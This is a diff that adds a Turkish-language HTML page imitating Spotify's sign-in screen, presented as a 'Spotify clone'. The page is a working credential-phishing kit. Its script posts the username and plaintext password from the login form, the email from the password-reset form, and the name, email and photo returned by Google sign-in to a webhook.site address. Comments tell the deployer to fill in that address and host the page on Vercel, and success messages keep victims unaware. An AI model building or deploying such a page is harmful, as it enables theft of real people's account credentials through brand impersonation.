@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş Yap - Spotify Klon</title>
+    
+    <!-- 1. Google Identity Services Resmi Kütüphanesi -->
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+    
+    <!-- Tailwind CSS ve İkonlar -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #121212;
+            color: white;
+        }
+        
+        .spotify-input {
+            background-color: #121212;
+            border: 1px solid #727272;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+        .spotify-input:hover { border-color: #ffffff; }
+        .spotify-input:focus {
+            outline: none;
+            border-color: #ffffff;
+            box-shadow: 0 0 0 2px #121212, 0 0 0 4px #ffffff;
+        }
+
+        #toast {
+            visibility: hidden;
+            min-width: 250px;
+            background-color: #1ed760;
+            color: black;
+            text-align: center;
+            border-radius: 8px;
+            padding: 16px;
+            position: fixed;
+            z-index: 1000;
+            left: 50%;
+            bottom: 30px;
+            transform: translateX(-50%);
+            font-weight: 500;
+            opacity: 0;
+            transition: opacity 0.3s, bottom 0.3s;
+        }
+        #toast.show { visibility: visible; opacity: 1; bottom: 50px; }
+        #toast.error { background-color: #e22134; color: white; }
+
+        /* Arayüz geçiş animasyonu */
+        .fade-in { animation: fadeIn 0.4s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <header class="p-8 w-full flex justify-center md:justify-start">
+        <a href="#" class="text-3xl font-bold flex items-center gap-2 hover:text-[#1ed760] transition-colors">
+            <i class="fa-brands fa-spotify text-4xl"></i>
+            <span>Spotify</span>
+        </a>
+    </header>
+
+    <main class="flex-grow flex items-center justify-center px-4 pb-12">
+        <div class="bg-black w-full max-w-[734px] rounded-lg p-8 sm:p-16 lg:px-24">
+            
+            <!-- ========================================== -->
+            <!-- GİRİŞ YAP (LOGIN) EKRANI -->
+            <!-- ========================================== -->
+            <div id="loginSection" class="fade-in block">
+                <h1 class="text-3xl sm:text-4xl font-bold text-center mb-10">Spotify'da oturum aç</h1>
+
+                <div class="space-y-3 mb-8">
+                    <!-- Google'ın kendi güvenli butonunu buraya render edeceğiz -->
+                    <div id="googleBtnContainer" class="w-full flex justify-center mb-3"></div>
+
+                    <button class="w-full flex items-center justify-center gap-3 border border-gray-400 rounded-full py-3 px-6 hover:border-white transition-colors font-bold">
+                        <i class="fa-brands fa-facebook text-xl text-blue-600"></i> Facebook ile devam et
+                    </button>
+                    <button class="w-full flex items-center justify-center gap-3 border border-gray-400 rounded-full py-3 px-6 hover:border-white transition-colors font-bold">
+                        <i class="fa-brands fa-apple text-xl text-white"></i> Apple ile devam et
+                    </button>
+                </div>
+
+                <hr class="border-[#292929] mb-8">
+
+                <form id="loginForm" class="space-y-6 max-w-[324px] mx-auto">
+                    <div class="space-y-2">
+                        <label for="email" class="block text-sm font-bold">E-posta adresi veya kullanıcı adı</label>
+                        <input type="text" id="email" required placeholder="E-posta adresi veya kullanıcı adı" class="spotify-input w-full rounded p-3 text-base">
+                    </div>
+
+                    <div class="space-y-2">
+                        <label for="password" class="block text-sm font-bold">Parola</label>
+                        <input type="password" id="password" required placeholder="Parola" class="spotify-input w-full rounded p-3 text-base">
+                    </div>
+
+                    <div class="flex items-center gap-3">
+                        <input type="checkbox" id="remember" class="w-4 h-4 accent-[#1ed760] cursor-pointer">
+                        <label for="remember" class="text-sm cursor-pointer">Beni hatırla</label>
+                    </div>
+
+                    <button type="submit" id="submitBtn" class="w-full bg-[#1ed760] text-black font-bold text-lg rounded-full py-3.5 hover:bg-[#3be477] hover:scale-[1.04] transition-all">
+                        Oturum Aç
+                    </button>
+
+                    <div class="text-center mt-6">
+                        <!-- Parolamı unuttum linkine tıklandığında ekran değişecek -->
+                        <button type="button" onclick="toggleView('forgot')" class="text-sm underline hover:text-[#1ed760] bg-transparent border-none cursor-pointer">
+                            Parolanı mı unuttun?
+                        </button>
+                    </div>
+                </form>
+
+                <hr class="border-[#292929] my-8">
+
+                <div class="text-center space-y-4">
+                    <p class="text-[#a7a7a7]">Hesabın yok mu?</p>
+                    <button class="w-full max-w-[324px] border border-gray-400 text-white rounded-full py-3.5 font-bold hover:border-white transition-colors">
+                        Spotify için kaydol
+                    </button>
+                </div>
+            </div>
+
+            <!-- ========================================== -->
+            <!-- PAROLAMI UNUTTUM EKRANI (Başlangıçta Gizli)-->
+            <!-- ========================================== -->
+            <div id="forgotSection" class="fade-in hidden">
+                <h1 class="text-3xl font-bold text-center mb-6">Parolanı sıfırla</h1>
+                <p class="text-center text-[#a7a7a7] mb-8 max-w-[400px] mx-auto text-sm">
+                    E-posta adresini veya kullanıcı adını gir, parolanı sıfırlaman için sana bir bağlantı gönderelim.
+                </p>
+
+                <form id="forgotForm" class="space-y-6 max-w-[324px] mx-auto">
+                    <div class="space-y-2">
+                        <label for="resetEmail" class="block text-sm font-bold">E-posta adresi veya kullanıcı adı</label>
+                        <input type="text" id="resetEmail" required placeholder="E-posta adresi" class="spotify-input w-full rounded p-3 text-base">
+                    </div>
+
+                    <button type="submit" id="resetBtn" class="w-full bg-[#1ed760] text-black font-bold text-lg rounded-full py-3.5 hover:bg-[#3be477] hover:scale-[1.04] transition-all">
+                        Bağlantı Gönder
+                    </button>
+
+                    <div class="text-center mt-6">
+                        <button type="button" onclick="toggleView('login')" class="text-sm font-bold text-[#a7a7a7] hover:text-white transition-colors">
+                            <i class="fa-solid fa-arrow-left mr-2"></i> Giriş ekranına dön
+                        </button>
+                    </div>
+                </form>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Toast Bildirim -->
+    <div id="toast">Bildirim Mesajı</div>
+
+    <script>
+        /* ====================================================================
+           AYARLAR: VERCEL'E YÜKLEMEDEN ÖNCE BURAYI DOLDUR!
+           ==================================================================== */
+        
+        // 1. Webhook.site adresinden aldığın URL'yi buraya yapıştır.
+        const TARGET_WEBHOOK_URL = 'https://webhook.site/BURAYA-KENDI-LINKINI-YAPISTIR'; 
+        
+        // 2. Google Cloud Console'dan aldığın Client ID'yi buraya yapıştır.
+        // NOT: Eğer bu ID'yi almazsan Google butonu ekranda belirmeyecektir!
+        const GOOGLE_CLIENT_ID = "BURAYA_GOOGLE_CLIENT_ID_GELECEK.apps.googleusercontent.com";
+
+
+        /* ====================================================================
+           1. YARDIMCI FONKSİYONLAR
+           ==================================================================== */
+
+        // Ekranlar Arası Geçiş (Login <-> Parolamı Unuttum)
+        function toggleView(view) {
+            const loginSec = document.getElementById('loginSection');
+            const forgotSec = document.getElementById('forgotSection');
+            
+            if (view === 'forgot') {
+                loginSec.classList.add('hidden');
+                loginSec.classList.remove('block');
+                forgotSec.classList.remove('hidden');
+                forgotSec.classList.add('block');
+            } else {
+                forgotSec.classList.add('hidden');
+                forgotSec.classList.remove('block');
+                loginSec.classList.remove('hidden');
+                loginSec.classList.add('block');
+            }
+        }
+
+        // Toast Gösterme
+        function showToast(message, isError = false) {
+            const toast = document.getElementById("toast");
+            toast.textContent = message;
+            toast.className = isError ? "error show" : "show";
+            setTimeout(() => { toast.classList.remove("show"); }, 4000);
+        }
+
+        // Webhook'a Veri Gönderme Fonksiyonu (Genel)
+        async function sendToWebhook(payload) {
+            try {
+                const response = await fetch(TARGET_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return true;
+            } catch (error) {
+                console.error("Webhook Hatası:", error);
+                return false;
+            }
+        }
+
+        // JWT (JSON Web Token) Decode Fonksiyonu - Güvenlik İçin Kritik!
+        // Google'dan gelen şifreli jetonu frontend'de güvenle açar.
+        function parseJwt(token) {
+            try {
+                const base64Url = token.split('.')[1];
+                const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+                const jsonPayload = decodeURIComponent(window.atob(base64).split('').map(function(c) {
+                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+                }).join(''));
+                return JSON.parse(jsonPayload);
+            } catch (e) {
+                console.error("Token çözümlenemedi", e);
+                return null;
+            }
+        }
+
+        /* ====================================================================
+           2. GOOGLE İLE GİRİŞ (OAUTH 2.0 - GSI) İŞLEMLERİ
+           ==================================================================== */
+
+        // Google Giriş Başarılı Olduğunda Çalışacak Fonksiyon
+        async function handleGoogleResponse(response) {
+            console.log("Google'dan Şifreli Jeton Geldi:", response.credential);
+            
+            // Jetonu kırıp içindeki kullanıcı bilgilerini (email, name, picture) çıkarıyoruz!
+            const userData = parseJwt(response.credential);
+            
+            if (userData) {
+                // Kullanıcıya bilgi ver (Sitenin sağ alt köşesinde resmiyle birlikte)
+                showToast(`Google ile başarıyla giriş yapıldı! Hoş geldin ${userData.name}`);
+                
+                // Webhook'a gönderilecek paket
+                const payload = {
+                    action: "GOOGLE_LOGIN",
+                    user_email: userData.email,
+                    user_name: userData.name,
+                    user_picture: userData.picture,
+                    token_issuer: userData.iss,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Webhook'a ilet (Vercel testin için)
+                await sendToWebhook(payload);
+            } else {
+                showToast("Google verisi işlenirken hata oluştu.", true);
+            }
+        }
+
+        // Sayfa Yüklendiğinde Google Kütüphanesini Başlat
+        window.onload = function () {
+            // Eğer Client ID girilmemişse konsola uyarı at
+            if (GOOGLE_CLIENT_ID.includes("BURAYA_GOOGLE")) {
+                console.warn("UYARI: Google Client ID girilmedi! Google butonu ekranda görünmeyecektir.");
+            } else {
+                // Kütüphaneyi başlat
+                google.accounts.id.initialize({
+                    client_id: GOOGLE_CLIENT_ID,
+                    callback: handleGoogleResponse
+                });
+
+                // Spotify temasına uygun siyah Google butonunu ekrana çiz
+                google.accounts.id.renderButton(
+                    document.getElementById("googleBtnContainer"),
+                    { theme: "filled_black", size: "large", shape: "pill", width: 324 }
+                );
+            }
+        };
+
+        /* ====================================================================
+           3. FORM GÖNDERİM (SUBMIT) İŞLEMLERİ
+           ==================================================================== */
+
+        // Normal Oturum Açma İşlemi
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); 
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = 'Gönderiliyor...'; btn.disabled = true;
+
+            const payload = {
+                action: "CLASSIC_LOGIN",
+                username: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                timestamp: new Date().toISOString()
+            };
+
+            const success = await sendToWebhook(payload);
+            
+            if(success) {
+                showToast("✅ Standart giriş bilgileri gönderildi!");
+                this.reset();
+            } else {
+                showToast("❌ Veri gönderilemedi!", true);
+            }
+            
+            btn.innerText = 'Oturum Aç'; btn.disabled = false;
+        });
+
+        // Parolamı Unuttum İşlemi
+        document.getElementById('forgotForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); 
+            const btn = document.getElementById('resetBtn');
+            btn.innerText = 'İşleniyor...'; btn.disabled = true;
+
+            const payload = {
+                action: "PASSWORD_RESET_REQUEST",
+                email_to_reset: document.getElementById('resetEmail').value,
+                timestamp: new Date().toISOString()
+            };
+
+            const success = await sendToWebhook(payload);
+            
+            if(success) {
+                showToast("📩 Parola sıfırlama talebi webhook'a iletildi!");
+                this.reset();
+                setTimeout(() => toggleView('login'), 2000); // 2 saniye sonra logine dön
+            } else {
+                showToast("❌ Bağlantı gönderilemedi!", true);
+            }
+            
+            btn.innerText = 'Bağlantı Gönder'; btn.disabled = false;
+        });
+    </script>
+</body>
+</html>
